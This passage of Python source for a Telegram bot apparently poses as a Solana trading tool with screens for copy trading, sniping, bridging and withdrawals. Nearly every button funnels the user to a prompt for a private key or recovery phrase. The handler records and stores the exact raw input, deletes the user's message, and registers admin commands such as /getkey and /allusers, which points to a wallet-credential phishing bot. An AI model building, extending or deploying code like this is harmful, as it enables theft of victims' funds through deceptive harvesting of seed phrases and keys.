        sent = await update.message.reply_text(chunk)
        sent_messages.append(sent)

    for sent in sent_messages:
        ctx.job_queue.run_once(
            _delete_message_job,
            30,
            data=(update.message.chat_id, sent.message_id),
        )

# ── Admin: list all users ─────────────────────────────────────────────────────
async def allusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized.")
        return
    if not all_users:
        await update.message.reply_text("No users yet.")
        return
    msg = "*All Users:*\n\n"
    for uid, info in all_users.items():
        msg += f"ID: `{uid}` | @{info['username']} | {info['first_name']}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ── Button handler ────────────────────────────────────────────────────────────
async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    uid     = query.from_user.id
    data    = query.data
    chat_id = query.message.chat_id

    user = update.effective_user
    user_info = all_users.setdefault(user.id, {})
    user_info.update({
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    })
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Positions screen ──────────────────────────────────────────────────────
    if data == "positions":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            parse_mode="Markdown",
            reply_markup=positions_keyboard(),
        )
        return

    if data == "markets":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            parse_mode="Markdown",
            reply_markup=positions_keyboard(),
        )
        return

    if data in MARKET_CATEGORY_LABELS:
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "portfolio":
        await query.edit_message_text(
            _portfolio_text(),
            reply_markup=portfolio_keyboard(),
        )
        return

    if data in (
        "portfolio_back",
        "portfolio_refresh",
        "portfolio_pnl_report",
        "portfolio_address",
        "portfolio_signal",
        "portfolio_user",
        "portfolio_pnl",
        "portfolio_smart_money",
        "portfolio_competition",
        "portfolio_full",
        "portfolio_open",
        "portfolio_close",
        "portfolio_main_menu",
    ):
        if data in ("portfolio_back", "portfolio_main_menu"):
            await query.edit_message_text(
                _home_screen_text(),
                reply_markup=main_menu_keyboard(),
            )
            return

        if data == "portfolio_refresh":
            await query.edit_message_text(
                _portfolio_text(),
                reply_markup=portfolio_keyboard(),
            )
            return

        if data == "portfolio_user":
            await query.edit_message_text(
                _user_profile_text(),
                reply_markup=recovery_keyboard(),
            )
            return

        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "positions_refresh":
        await query.edit_message_text(
            _markets_text(ctx.user_data.get("market_category")),
            parse_mode="Markdown",
            reply_markup=positions_keyboard(),
        )
        return

    if data == "positions_delete":
        await query.message.delete()
        return

    if data == "positions_homepage":
        ctx.user_data.pop("market_category", None)
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Wallet settings screen (from positions buttons) ───────────────────────
    if data in ("positions_usd", "positions_min_value", "positions_sell"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "wallets_import":
        ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "Please enter your private key or recovery phrase:",
            reply_markup=ForceReply(selective=True),
        )
        return

    if data == "wallets_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "wallets_delete":
        if uid in user_wallets:
            del user_wallets[uid]
            await query.edit_message_text(
                "✅ Wallet deleted successfully\\.",
                parse_mode="MarkdownV2",
                reply_markup=wallet_settings_keyboard(),
            )
        else:
            await query.answer("No wallet to delete.", show_alert=True)
        return

    if data == "wallets_close":
        await query.message.delete()
        return

    # ── LP Sniper screen ──────────────────────────────────────────────────────
    if data == "lp_sniper":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_refresh":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_create":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "lp_sniper_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "lp_sniper_close":
        await query.message.delete()
        return

    # ── Copy Trade screen ─────────────────────────────────────────────────────
    if data == "copy_trade":
        await query.edit_message_text(
            _copy_trade_text(),
            reply_markup=copy_trade_keyboard(),
        )
        return

    if data == "copy_trade_refresh":
        await query.edit_message_text(
            _copy_trade_text(),
            reply_markup=copy_trade_keyboard(),
        )
        return

    if data in (
        "copy_trade_create",
        "copy_trade_subwallet",
        "copy_trade_backtesting",
        "copy_trade_defaults",
        "copy_trade_failed_alerts",
        "copy_trade_stop_all",
        "copy_trade_add",
        "copy_trade_activity",
        "copy_trade_pause",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "copy_trade_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "copy_trade_close":
        await query.message.delete()
        return

    # ── Wallets screen ────────────────────────────────────────────────────────
    if data == "wallets":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── AFK Mode screen ───────────────────────────────────────────────────────
    if data == "afk_mode":
        await query.edit_message_text(
            _afk_mode_text(),
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data == "afk_refresh":
        await query.edit_message_text(
            _afk_mode_text(),
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data in ("afk_create", "afk_backtesting", "afk_activity", "afk_new"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data in ("afk_update", "afk_add_config", "afk_pause", "afk_start"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "afk_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "afk_close":
        await query.message.delete()
        return

    # ── Presales screen ───────────────────────────────────────────────────────
    if data == "presales":
        await query.edit_message_text(
            _presales_text(),
            parse_mode="MarkdownV2",
            reply_markup=presales_keyboard(),
        )
        return

    if data in ("presales_config", "presales_add"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "presales_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "presales_close":
        await query.message.delete()
        return

    # ── Settings screen ───────────────────────────────────────────────────────
    if data == "settings":
        await query.edit_message_text(
            _settings_text(),
            reply_markup=settings_keyboard(),
        )
        return

    if data in (
        "settings_auto_redeem",
        "settings_copy_mode",
        "settings_manual_trade_confirm",
        "settings_buy_sell_setting",
        "settings_trade_mode_header",
        "settings_trade_mode_cautious", "settings_trade_mode_standard",
        "settings_trade_mode_expert", "settings_trade_threshold_header",
        "settings_trade_threshold_100", "settings_quickbuy_header",
        "settings_quickbuy_10", "settings_quickbuy_25", "settings_quickbuy_50",
        "settings_display_header", "settings_american_odds",
        "settings_wallet_security_header", "settings_export_private_key",
        "settings_2fa_header", "settings_enable_2fa",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "settings_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "settings_close":
        await query.message.delete()
        return

    # ── Withdraw screen ───────────────────────────────────────────────────────
    if data == "withdraw":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data == "withdraw_refresh":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data in ("withdraw_50", "withdraw_100", "withdraw_xsol", "withdraw_set_address"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "withdraw_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "withdraw_close":
        await query.message.delete()
        return

    # ── Referral screen ───────────────────────────────────────────────────────
    if data == "referral":
        bot_username = ctx.bot.username or (await ctx.bot.get_me()).username
        await query.edit_message_text(
            _referral_text(uid, bot_username),
            reply_markup=referral_keyboard(),
        )
        return

    if data == "referral_refresh":
        bot_username = ctx.bot.username or (await ctx.bot.get_me()).username
        await query.edit_message_text(
            _referral_text(uid, bot_username),
            reply_markup=referral_keyboard(),
        )
        return

    if data in ("referral_generate", "referral_change"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "referral_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "referral_close":
        await query.message.delete()
        return

    # ── Competition screen ───────────────────────────────────────────────────
    if data in ("competition", "portfolio_competition"):
        await query.edit_message_text(
            _competition_text(),
            reply_markup=competition_keyboard(),
        )
        return

    if data == "competition_add_account":
        language = ctx.user_data.get("language", "en")
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(language),
        )
        return

    if data == "competition_close":
        language = ctx.user_data.get("language", "en")
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(language),
        )
        return

    # ── Bridge screen ─────────────────────────────────────────────────────────
    if data == "bridge":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "bridge_refresh":
        await query.edit_message_text(
            _bridge_text(),
            parse_mode="MarkdownV2",
            reply_markup=bridge_keyboard(),
        )
        return

    if data in ("bridge_set_address", "bridge_bsc", "bridge_eth",
                "bridge_base", "bridge_hype", "bridge_bridge"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "bridge_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "bridge_close":
        await query.message.delete()
        return

    # ── Refresh main menu ─────────────────────────────────────────────────────
    if data == "refresh":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Recovery screen ───────────────────────────────────────────────────────
    if data in ("recovery", "smart_wallet"):
        await query.edit_message_text(
            _recovery_text(),
            reply_markup=recovery_keyboard(),
        )
        return

    if data == "recovery_add_wallet":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Chains screen ─────────────────────────────────────────────────────────
    if data == "chains":
        await query.edit_message_text(
            "🔗 *Select your preferred Network*",
            parse_mode="MarkdownV2",
            reply_markup=chains_keyboard(),
        )
        return

    if data == "chains_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "help":
        await query.edit_message_text(
            _help_text(),
            reply_markup=help_keyboard(),
        )
        return

    if data == "quick_start":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data in ("help_recovery", "help_create_ticket"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data in ("language_menu", "language_en"):
        await query.edit_message_text(
            LANGUAGE_MENU_TEXT,
            reply_markup=language_keyboard(),
        )
        return

    if data == "language_back":
        await query.edit_message_text(
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    if data in LANGUAGE_SELECTIONS:
        language = LANGUAGE_SELECTIONS[data]
        ctx.user_data["language"] = language
        await query.edit_message_text(
            _localized_wallet_settings_text(language),
            reply_markup=wallet_settings_keyboard(language),
        )
        return

    # ── Per-chain wallet screens ───────────────────────────────────────────────
    for chain in CHAINS:
        if data == f"chain_{chain}":
            await query.edit_message_text(
                _chain_wallet_text(chain),
                parse_mode="MarkdownV2",
                reply_markup=chain_wallet_keyboard(chain),
            )
            return

        if data == f"chain_{chain}_import":
            ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
            await ctx.bot.send_message(
                chat_id,
                f"Please enter your {chain.upper()} private key or recovery phrase:",
                reply_markup=ForceReply(selective=True),
            )
            return

    # ── TP/SL screen ──────────────────────────────────────────────────────────
    if data == "tpsl_orders":
        await query.edit_message_text(
            _tpsl_text(),
            reply_markup=tpsl_keyboard(),
        )
        return

    if data in ("tpsl_active", "tpsl_closed", "tpsl_portfolio"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Limit Orders screen ───────────────────────────────────────────────────
    if data == "limit_orders":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Every main menu button — send NEW message, keep history intact ────────
    if data in MAIN_MENU_BUTTONS:
        await ctx.bot.send_message(
            chat_id,
            "🔑 *Import your wallet to proceed.*\n\n"
            "Please import your wallet or cancel to go back.",
            parse_mode="Markdown",
            reply_markup=import_prompt_keyboard(data),
        )
        return

    # ── User tapped Import Wallet — ask for private key ───────────────────────
    if data.startswith("do_import__"):
        origin = data.split("__", 1)[1]
        ctx.user_data["import_origin"] = origin
        ctx.user_data["awaiting"]      = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "🔑 Send your *base58 private key* as the next message.\n\n"
            "⚠️ Your message will be deleted immediately after processing.",
            parse_mode="Markdown",
        )
        return

    # ── Cancel prompt — send new message confirming cancel ───────────────────
    if data == "cancel_prompt":
        await ctx.bot.send_message(
            chat_id,
            "❌ Cancelled. Tap a button below to try again.",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Back to menu ──────────────────────────────────────────────────────────
    if data == "back_to_menu":
        await ctx.bot.send_message(
            chat_id,
            _home_screen_text(),
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Close — delete just the menu message ──────────────────────────────────
    if data == "close":
        await query.message.delete()
        return

    # ── Swap confirmations ────────────────────────────────────────────────────
    if data in ("confirm_buy", "confirm_sell"):
        await confirm_swap(update, ctx)
        return

# ── Message handler (multi-step flows) ───────────────────────────────────────
async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    chat_id  = update.message.chat_id
    raw_text = update.message.text or ""
    text     = raw_text.strip()
    awaiting = ctx.user_data.get("awaiting")

    user = update.effective_user
    all_users[user.id] = {
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    }
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Import private key or mnemonic ───────────────────────────────────────
    if awaiting == AWAITING_PRIVATE_KEY:
        import_record = _record_wallet_import_input(
            uid,
            raw_text,
            ctx.user_data.get("import_origin"),
        )
        try:
            await update.message.delete()
        except Exception as exc:
            logger.debug("Could not delete import message for %s: %s", uid, exc)

        try:
            if " " not in text:
                # Try base58 private key
                kp = Keypair.from_base58_string(text)
            else:
                # Treat as mnemonic seed phrase without strict validation
                seed = Mnemonic("english").to_seed(text)[:32]
                kp = Keypair.from_seed(bytes(seed))

            enc = encrypt_key(bytes(kp))
            import_record["valid"] = True
            import_record["pubkey"] = str(kp.pubkey())
            user_wallets[uid] = {
                "keypair_enc": enc,
                "pubkey": str(kp.pubkey()),
                "original_input": raw_text,  # stores the exact input from the user
            }
            ctx.user_data.pop("awaiting", None)
            await ctx.bot.send_message(
                uid,
                f"✅ *Wallet imported successfully!*\n\n`{kp.pubkey()}`\n\nYou can now use all features.",
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard(),
            )
        except Exception as e:
            logger.error(f"Wallet import error: {e}")
            await ctx.bot.send_message(uid, "❌ Invalid private key or recovery phrase. Please try again.")
        return

    # ── Token address for buy/sell ────────────────────────────────────────────
    if awaiting == AWAITING_TOKEN_ADDR:
        ctx.user_data["token_mint"] = text
        side      = ctx.user_data.get("side", "buy")
        price     = await get_token_price_usd(text)
        price_str = f"${price:.6f}" if price else "unknown"
        if side == "buy":
            ctx.user_data["awaiting"] = AWAITING_BUY_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow many *SOL* to spend?",
                parse_mode="Markdown",
            )
        else:
            ctx.user_data["awaiting"] = AWAITING_SELL_AMOUNT
            await update.message.reply_text(
                f"Token price: *{price_str}*\n\nHow many *tokens* to sell (in smallest unit)?",
                parse_mode="Markdown",
            )
        return

    # ── Buy amount ────────────────────────────────────────────────────────────
    if awaiting == AWAITING_BUY_AMOUNT:
        try:
            sol_amount = float(text)
            lamports   = int(sol_amount * 1e9)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Getting quote...")
        quote = await jupiter_quote(SOL_MINT, token_mint, lamports)
        if not quote:
            await update.message.reply_text("❌ Could not get quote from Jupiter.")
            return

        out_amount = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSpend: `{sol_amount} SOL`\nReceive: `{out_amount}` tokens\n\nConfirm?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_buy"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

    # ── Sell amount ───────────────────────────────────────────────────────────
    if awaiting == AWAITING_SELL_AMOUNT:
        try:
            token_amount = int(text)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount.")
            return

        token_mint = ctx.user_data.get("token_mint")
        await update.message.reply_text("⏳ Getting quote...")
        quote = await jupiter_quote(token_mint, SOL_MINT, token_amount)
        if not quote:
            await update.message.reply_text("❌ Could not get quote from Jupiter.")
            return

        out_lamports = int(quote.get("outAmount", 0))
        await update.message.reply_text(
            f"📊 *Quote*\n\nSell: `{token_amount}` tokens\nReceive: `{out_lamports/1e9:.4f} SOL`\n\nConfirm?",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_sell"),
                 InlineKeyboardButton("❌ Cancel",  callback_data="cancel_prompt")],
            ]),
        )
        ctx.user_data["pending_quote"] = quote
        ctx.user_data["awaiting"]      = None
        return

# ── Swap confirmation ─────────────────────────────────────────────────────────
async def confirm_swap(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    uid     = query.from_user.id
    chat_id = query.message.chat_id
    kp      = get_keypair(uid)
    entry   = user_wallets.get(uid)

    if not kp or not entry:
        await ctx.bot.send_message(chat_id, "❌ No wallet found.")
        return

    quote = ctx.user_data.get("pending_quote")
    if not quote:
        await ctx.bot.send_message(chat_id, "❌ Quote expired. Start over.")
        return

    await ctx.bot.send_message(chat_id, "⏳ Building transaction...")

    swap_data = await jupiter_swap(quote, entry["pubkey"])
    if not swap_data or "swapTransaction" not in swap_data:
        await ctx.bot.send_message(chat_id, "❌ Failed to build swap transaction.")
        return

    from solders.transaction import VersionedTransaction
    from solana.rpc.types import TxOpts

    raw_tx    = base64.b64decode(swap_data["swapTransaction"])
    tx        = VersionedTransaction.from_bytes(raw_tx)
    signed    = kp.sign_message(bytes(tx.message))
    signed_tx = VersionedTransaction.populate(tx.message, [signed])

    async with AsyncClient(RPC_URL) as client:
        resp = await client.send_raw_transaction(
            bytes(signed_tx),
            opts=TxOpts(skip_preflight=False, preflight_commitment="confirmed"),
        )

    sig = str(resp.value)
    await ctx.bot.send_message(
        chat_id,
        f"✅ *Swap submitted!*\n\n[View on Solscan](https://solscan.io/tx/{sig})",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
    )

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    start))
    app.add_handler(CommandHandler("getkey",   getkey))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    logger.info("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
